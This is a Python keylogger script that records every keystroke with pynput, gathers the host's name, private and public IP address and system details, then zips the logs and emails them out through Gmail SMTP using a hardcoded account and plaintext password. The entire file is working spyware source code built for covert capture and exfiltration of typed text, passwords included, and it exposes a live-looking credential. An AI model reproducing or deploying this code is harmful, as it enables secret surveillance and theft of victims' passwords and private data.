#Logger Library
from pynput.mouse import Controller
from pynput.keyboard import Listener, Key

#Email Library
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#for zipping file
from zipfile import ZipFile

import socket
import platform

#import win32clipboard

import time

import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

log_file = r"\keylog.txt"
system_file = r"\systeminfo.txt"
clipboard_file = r"\clipboard.txt"
file_path = r"Z:\keylogger\email"

email_address = "keyloggerproject4@gmail.com"
password = "Keylogger12345!"
to_address = "keyloggerproject4@gmail.com"

email_folder = r"Z:\keylogger\email"
email_folder_zip = r"Z:\keylogger\email.zip"

def send_email(file_path, attachment, to_address):

    from_address = email_address

    msg = MIMEMultipart()

    msg['From'] = from_address

    msg['To'] = to_address

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = file_path
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'zip')

    p.set_payload(attachment.read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(from_address, password)

    text = msg.as_string()

    s.sendmail(from_address, to_address, text)

    s.quit()

def zip_folder(file_name, file_name2):
    zipfile = ZipFile('email.zip', 'w')
    zipfile.write(file_name)
    zipfile.write(file_name2)

print('zip file created successfully')


def computer_information():
    with open(file_path + system_file, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: \n" + public_ip)

        except Exception:
            f.write("Could not get Public IP Address.")

        f.write("Processor" + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + "  " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname:" + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()
zip_folder(email_folder + log_file,email_folder + system_file)
send_email(log_file, email_folder_zip, to_address)


#pypnut logger methods
count = 0
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count - 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + log_file, "a") as f:
        for key in keys:
            k = str(key).replace(",", " ")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()